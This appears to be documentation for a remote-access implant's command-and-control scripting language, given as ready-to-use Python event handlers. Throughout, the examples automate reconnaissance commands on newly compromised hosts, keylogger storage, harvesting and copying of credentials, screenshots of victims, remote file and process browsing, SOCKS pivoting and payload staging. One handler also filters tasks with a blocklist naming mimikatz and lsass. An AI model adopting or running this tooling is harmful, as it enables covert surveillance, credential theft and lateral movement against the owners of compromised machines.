# Examples

Short scripts mixing NukeScript commands with normal Python. Handlers run on the team server — files, paths, and imports work like regular Python.

Layout: imports and functions first → `event.<name>:function()` lines at the **end**.

Running sync and async commands on a new implant

```python
def format_host(host):
    user = host.get("user", "?")
    name = host.get("hostname", host["tag"])
    return f"[+] new implant: {user} @ {name}"

def on_connect(host):
    echo(format_host(host))
    cmd(host["tag"], "whoami")
    async_cmd(host["tag"], "hostname")

event.new_host:on_connect()
```


Notifying when a host is removed

```python
import json
import os

def on_removed(host):
    path = f"/tmp/nukerat/removed/{host['tag']}.json"
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        json.dump(host, f, default=str)
    message_box("Host removed", host["tag"], type="info")

event.removed_host:on_removed()
```


Logging expired hosts

```python
def on_expired(host):
    echo(f"{host['tag']} missed check-in ({host.get('user', '?')})")

event.expired_host:on_expired()
```


Filtering the queue with a blocklist

```python
def filter_task(task):
    blocked = ["mimikatz", "lsass"]
    text = (task.get("input") or "").lower()
    if any(w in text for w in blocked):
        reject_cmd(task["tag"])
    else:
        approve_cmd(task["tag"])

event.new_queue_line:filter_task()
```


Echoing implant errors to the output

```python
def on_fail(task):
    echo(f"error on {task['host']}: {task.get('error', '?')}")

event.implant_error:on_fail()
```


Finishing a task with a custom response

```python
def on_done(task):
    msg = f"done: {(task.get('input') or '')[:80]}"
    conclude(task["tag"], msg)

event.task_completed:on_done()
```


Logging check-ins and host count

```python
def on_checkin(row):
    echo(f"checkin {row['type']} from {row['host']} — total hosts: {len(db.hosts())}")

event.new_checkin:on_checkin()
```


Saving keylogger rows and listing all entries

```python
import os

def on_keys(entry):
    path = f"/tmp/nukerat/keys/{entry['host_tag']}/{entry['tag']}.txt"
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        f.write(entry["content"])
    echo(f"keylogs in db: {len(keylogs())}")

event.keylogger_update:on_keys()
```


Listing a remote folder when file browser data updates

```python
def on_folder(row):
    path = (row.get("path") or "").replace("\\", "/")
    folders(row["host"], path)

event.folders_update:on_folder()
```


Requesting a process tree when process data changes

```python
def on_process(row):
    process(row["host"])
    echo(f"process tree requested for {row['host']}")

event.process_update:on_process()
```


Appending terminal output to a daily log

```python
import os
from datetime import date

def log_output(line):
    path = f"/tmp/nukerat/logs/{date.today()}.log"
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "a") as f:
        f.write(f"[{line['host']}] {line['output']}\n")

event.output_received:log_output()
```


Managing credentials on store and cleanup

```python
def on_cred(cred):
    message_box("Credential", f"{cred['name']} on {cred['host']}", type="success")
    echo(f"total credentials: {len(credentials())}")
    tag = credentials.add("backup", cred["host"], "auto copy", cred["content"])
    credentials.remove(tag)

event.credentials_update:on_cred()
```


Opening SOCKS and port forward on a new listener

```python
def on_listener(row):
    if row["type"] != "channel":
        return
    hosts = db.hosts()
    if not hosts:
        return
    tag = hosts[0]["tag"]
    echo(f"socks: {network.add_socks(tag, 1080)}")
    echo(f"forward: {network.add_forward(tag, 8080, '127.0.0.1', 80)}")

event.listeners_update:on_listener()
```


Restarting and removing a network session on a timer

```python
def manage_net(_):
    listeners = db.listeners()
    if not listeners:
        return
    sid = listeners[0]["tag"]
    echo(network.restart(sid))
    echo(network.remove(sid))

event.heartbeat_60m:manage_net()
```


Uploading and deleting files on the file server

```python
def file_ops(_):
    file_server.upload(8080, "/opt/payload.bin")
    file_server.delete(8080, "old.bin")

event.heartbeat_1d:file_ops()
```


Prompting an AI agent on a schedule

```python
def ask_agent(_):
    agents = db.agents()
    if agents:
        agent(agents[0]["tag"], "Summarize active hosts.")

event.heartbeat_12h:ask_agent()
```


Capturing a screenshot on first connect

```python
from pathlib import Path

def grab_screen(host):
    out = Path("/tmp/nukerat/screens") / f"{host['tag']}.png"
    out.parent.mkdir(parents=True, exist_ok=True)
    screenshot(host["tag"], output=str(out))
    echo(f"saved {out}")

event.new_host:grab_screen()
```


Querying queue rows from the database

```python
import json

def dump_queue(_):
    rows = db.queue()
    echo(f"queue size: {len(rows)}")
    with open("/tmp/nukerat/queue.json", "w") as f:
        json.dump(rows[:10], f, default=str)

event.heartbeat_5m:dump_queue()
```


All heartbeat intervals (same function, many bindings)

```python
def tick(_):
    echo("heartbeat")

event.heartbeat_1s:tick()
event.heartbeat_5s:tick()
event.heartbeat_10s:tick()
event.heartbeat_15s:tick()
event.heartbeat_30s:tick()
event.heartbeat_1m:tick()
event.heartbeat_5m:tick()
event.heartbeat_10m:tick()
event.heartbeat_15m:tick()
event.heartbeat_20m:tick()
event.heartbeat_30m:tick()
event.heartbeat_60m:tick()
event.heartbeat_2h:tick()
event.heartbeat_12h:tick()
event.heartbeat_1d:tick()
event.heartbeat_3d:tick()
event.heartbeat_7d:tick()
event.heartbeat_15d:tick()
event.heartbeat_30d:tick()
```
